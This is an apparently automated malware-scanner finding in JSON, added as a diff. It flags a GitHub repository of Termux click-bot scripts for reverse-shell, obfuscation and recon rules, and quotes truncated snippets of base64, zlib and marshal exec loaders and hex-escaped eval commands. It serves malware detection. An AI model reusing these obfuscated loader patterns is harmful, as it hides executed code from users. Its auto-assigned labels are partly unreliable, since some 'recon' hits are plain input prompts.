@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:zusyaku/script-nuyul-termux",
+    "kind": "repository",
+    "family": "",
+    "id": "zusyaku/script-nuyul-termux",
+    "url": "https://github.com/Zusyaku/Script-Nuyul-Termux",
+    "registry": "github",
+    "owner": "zusyaku",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 28,
+    "detection_method": "ioc_search",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "reverse_shell/nc-exec; obfuscation/py-decode-exec; obfuscation/hex-escapes; enumeration/host-recon; obfuscation/eval-subshell; code_execution/py-dyn; obfuscation/hex-blob",
+    "evidence_locations": "nuyul-bestmining\\bestmining.sh:2; nuyul-prolike\\prolike.sh:2; dogeclick/doge.py:4; dogeclickbot/doge.py:2; Zcashbottele/zec/zec.py:2; Base64_encode-main\\Main.sh:75; cryptoplace\\cryptoplace.sh:2; goins\\goins.sh:2; nuyul-bitland\\bitland.sh:2; nuyul-goins\\goins.sh:2; nuyul-like_share\\like-share.sh:2; nuyul-lootbull\\lootbull.sh:2; scraper\\Adder\\setup.py:34; scraper\\Adder\\setup.py:35; scraper\\Adder\\setup.py:36; Base64_encode-main\\result\\result.sh:1; enc.py:26; tds99.php:5",
+    "c2_hosts": "",
+    "iocs": "nuyul-bestmining\\bestmining.sh",
+    "matched_signatures": "ap.luckpool.net",
+    "reasons": "Code references OSM IOC(s) ['ap.luckpool.net'] in ['Mining verus di hp.txt'] | Tier-2 confirmed (bash score 28)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T213825Z",
+    "last_seen": "hunt-20260910T213825Z",
+    "evidence_file": "repositories/zusyaku_script-nuyul-termux.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "nuyul-bestmining\\bestmining.sh",
+      "line": 2,
+      "category": "reverse_shell",
+      "rule": "nc-exec",
+      "snippet": "\";nDz='$LCz';mkBz='$QNz';Agz='='\\''ux';FKz='C'\\'';n';skBz='WNz$';Eqz=';gaz';GVz='z$OB';WZBz='z$yB';JHBz=' Sa'\\''';lKz='ARz=';DTBz=''\\''$pI';Cvz=''\\'';iS';hVBz='\\'\\'''\\''|';llBz='MOz$';muz=';MKz';VSBz="
+    },
+    {
+      "file": "nuyul-prolike\\prolike.sh",
+      "line": 2,
+      "category": "reverse_shell",
+      "rule": "nc-exec",
+      "snippet": "\";jPBz=';hGz';dcCz=';fKB';dXz='Uz='\\''';dSBz=';eLB';NZCz=''\\''-'\\''\\';ZkDz='$Uvz';biBz='║'\\'';V';RACz=';aSz';exDz='z$qI';sKCz=';xJB';Jmz=';WMB';Huz='='\\'' !';RDBz=''\\''gin';otz='z'\\'';C';cYCz=''\\'';rP"
+    },
+    {
+      "file": "dogeclick/doge.py",
+      "line": 4,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode(\"ZnJvbSB0ZWxldGhvbiBpbXBvcnQgVGVsZWdyYW1DbGllbnQsIHN5bmMsIGV2ZW50cw0KZnJvbSB0ZWxldGhvbi50bC5mdW5jdGlvbnMubWVzc2FnZXMgaW1wb3J0ICgNCiAgICBHZXRIaXN"
+    },
+    {
+      "file": "dogeclickbot/doge.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "embedded compiled/marshalled payload (hidden stager) | exec(zlib.decompress(base64.b64decode(\"eJztGsmOGzf2Xl9BM5fStLpaS8s9kEdA2m1PEsR2grSXCdyGQFVREqPawmJ1t2L4YARzyDEDe645BHMaeAkMDAYIZj7GX5BPmEfWvkqyfc"
+    },
+    {
+      "file": "Zcashbottele/zec/zec.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('ZnJvbSB0ZWxldGhvbiBpbXBvcnQgVGVsZWdyYW1DbGllbnQsIHN5bmMsIGV2ZW50cwpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5tZXNzYWdlcyBpbXBvcnQgKAogICAgR2V0SGlzdG9"
+    },
+    {
+      "file": "Base64_encode-main\\Main.sh",
+      "line": 75,
+      "category": "obfuscation",
+      "rule": "hex-escapes",
+      "snippet": "goto_1=\"set +x;$'\\x65\\x76\\x61\\x6c' \"'\"$('\"$'\\x62\\x61\\x73\\x65\\x36\\x34' $'\\x2d\\x64' <<< ${b64}\"')\"' @ useful for building an execution pattern"
+    },
+    {
+      "file": "cryptoplace\\cryptoplace.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";VVBz=''\\'''\\'';i';KBCz='z$Gc';HIz='jKz$';dSz=''\\''i '\\''';VFz=''\\'';wX';cpz='BYz=';jgBz='$nJz';HWz=''\\''p'\\'';';wYBz='z$HC';wgBz='AKz$';xnz=';ZRz';clBz='ROz$';QJCz='z$Mk';Jcz=''\\'';sV';dBBz=''\\'';SZ"
+    },
+    {
+      "file": "goins\\goins.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";Olz='BVz'\\''';oVBz='CC'\\'';';nyCz='z$mN';uWz='YUBz';xrDz='dGBz';YiCz=''\\'';aY';ZWBz='='\\''0;';ZtBz='$fH'\\''';UHBz='oz$l';FQDz='dz$T';gABz=''\\'''\\''k'\\''';rfBz='$K'\\'';';TbDz='z$tn';CuBz='\\'\\'''\\''╔'"
+    },
+    {
+      "file": "nuyul-bestmining\\bestmining.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";nDz='$LCz';mkBz='$QNz';Agz='='\\''ux';FKz='C'\\'';n';skBz='WNz$';Eqz=';gaz';GVz='z$OB';WZBz='z$yB';JHBz=' Sa'\\''';lKz='ARz=';DTBz=''\\''$pI';Cvz=''\\'';iS';hVBz='\\'\\'''\\''|';llBz='MOz$';muz=';MKz';VSBz="
+    },
+    {
+      "file": "nuyul-bitland\\bitland.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";RGCz='hz$O';bQz=''\\'';Vl';AiBz='Kz$P';SKCz='lz$Z';MECz='ez$t';RKz=';'\\'';D';PVz='='\\''bK';ivz='c'\\'';J';MVz='$'\\'';H';IPBz=''\\''e'\\''\\';ez=';dz=';IoBz='$EQz';oHBz=''\\''_'\\''\\';saBz='Dz$g';qkz=''\\'''"
+    },
+    {
+      "file": "nuyul-goins\\goins.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";VZBz=':'\\'';M';OdEz='jZBz';rSBz=''\\'';Xb';njEz='$yiB';ooEz='HpBz';RcBz='kcBz';yNz=';hsz';HVEz='$dNB';LfCz='QcBz';wjCz=';p'\\'';';xbz='i $'\\''';KODz='GGz$';Yaz=';ypz';PjCz=''\\''rLz';bcCz=''\\''aIz';HXE"
+    },
+    {
+      "file": "nuyul-like_share\\like-share.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";hTDz=')'\\''\\'\\''';VXFz='Cz$k';bqFz='$ntz';wNz=''\\'''\\''*\\';IpFz='z$cs';yiEz='J'\\'';h';xeHz='z$fO';vrBz=';jgC';GiFz='z$Nm';nBFz='z$lI';nDz='fi'\\''\\';gkBz=''\\'';WZ';Hez='jz$'\\''';ctCz='Cz$g';bODz=''\\'"
+    },
+    {
+      "file": "nuyul-lootbull\\lootbull.sh",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "eval-subshell",
+      "snippet": "${@^^} ${@^^} eval \"$(     \"${@/e#-e#7/744-x}\" pr''i'n't${@}f \"CmI9IlwwMzNbMzQ7MW0iCiBwPSJcMDMzWzM5OzFtIgogIGs9IlwwMzNbMzM7MW0iCiAgIG09IlwwMzNbMzE7MW0iCiAgICBoPSJcMDMzWzMyOzFtIgogICAgIGM9IlwwMzNbMzU7M"
+    },
+    {
+      "file": "nuyul-prolike\\prolike.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";jPBz=';hGz';dcCz=';fKB';dXz='Uz='\\''';dSBz=';eLB';NZCz=''\\''-'\\''\\';ZkDz='$Uvz';biBz='║'\\'';V';RACz=';aSz';exDz='z$qI';sKCz=';xJB';Jmz=';WMB';Huz='='\\'' !';RDBz=''\\''gin';otz='z'\\'';C';cYCz=''\\'';rP"
+    },
+    {
+      "file": "scraper\\Adder\\setup.py",
+      "line": 34,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "xid = input(gr+\"[+] enter api ID : \"+re)"
+    },
+    {
+      "file": "scraper\\Adder\\setup.py",
+      "line": 35,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "cpass.set('cred', 'id', xid)"
+    },
+    {
+      "file": "scraper\\Adder\\setup.py",
+      "line": 36,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "xhash = input(gr+\"[+] enter hash ID : \"+re)"
+    },
+    {
+      "file": "Base64_encode-main\\result\\result.sh",
+      "line": 1,
+      "category": "obfuscation",
+      "rule": "hex-escapes",
+      "snippet": "set +x;$'\\x65\\x76\\x61\\x6c' \"$($'\\x62\\x61\\x73\\x65\\x36\\x34' $'\\x2d\\x64' <<< IyEvYmluL2Jhc2gKCmlucHV0Xz0kKGRpYWxvZyAtLXRpdGxlICJCeSBQb2x5Z29uIiAtLWlucHV0Ym94ICJtYXN1a2FuIG5hbWEgZmlsZSIgMTUgNjAgLS1zdGRvdX"
+    },
+    {
+      "file": "enc.py",
+      "line": 26,
+      "category": "code_execution",
+      "rule": "py-dyn",
+      "snippet": "sv = 'import marshal, zlib, base64\\nexec(marshal.loads(zlib.decompress(base64.b64decode(\"{}\"))))'"
+    },
+    {
+      "file": "tds99.php",
+      "line": 5,
+      "category": "obfuscation",
+      "rule": "hex-blob",
+      "snippet": "if(!version_compare(PHP_VERSION,\"5.6\",\">=\"))exit((\"\\x42\\xE1\\xBA\\xA1\\x6E\\x20\\xC4\\x91\\x61\\x6E\\x67\\x20\\x73\\xE1\\xBB\\xAD\\x20\\x64\\xE1\\xBB\\xA5\\x6E\\x67\\x20\\x70\\x68\\x69\\xC3\\xAA\\x6E\\x20\\x62\\xE1\\xBA\\xA3\\x6E\\x20\\"
+    }
+  ],
+  "commit_sha": "3ec339ea8fd048aec91136400513c79f66a807af",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/zusyaku/script-nuyul-termux",
+    "version_info": "all",
+    "threat_description": "Reverse shell backdoor. Payload in nuyul-bestmining\\bestmining.sh, nuyul-prolike\\prolike.sh.\nOutbound: C2. It opens a remote shell to an attacker host (nuyul-bestmining\\bestmining.sh:2, nuyul-prolike\\prolike.sh:2).\nThe same dropper is planted in 2 directories.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: ap.luckpool.net.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: nuyul-bestmining\\bestmining.sh, nuyul-prolike\\prolike.sh\n- Outbound: C2. It opens a remote shell to an attacker host (nuyul-bestmining\\bestmining.sh:2, nuyul-prolike\\prolike.sh:2).\n- nuyul-bestmining\\bestmining.sh:2: netcat hands a shell to a remote host (reverse shell) (+1 more)\n- nuyul-bestmining\\bestmining.sh:2: matches malware behavior",
+    "publisher": "zusyaku",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-bestmining\\bestmining.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-prolike\\prolike.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/dogeclick/doge.py#L4\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/dogeclickbot/doge.py#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/Zcashbottele/zec/zec.py#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/Base64_encode-main\\Main.sh#L75\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/cryptoplace\\cryptoplace.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/goins\\goins.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-bitland\\bitland.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-goins\\goins.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-like_share\\like-share.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/nuyul-lootbull\\lootbull.sh#L2\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/scraper\\Adder\\setup.py#L34\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/scraper\\Adder\\setup.py#L35\nhttps://github.com/zusyaku/script-nuyul-termux/blob/3ec339ea8fd048aec91136400513c79f66a807af/scraper\\Adder\\setup.py#L36",
+    "verified_iocs": "nuyul-bestmining\\bestmining.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T21:38:25Z",
+    "last_seen": "2026-09-10T21:38:25Z"
+  }
+}
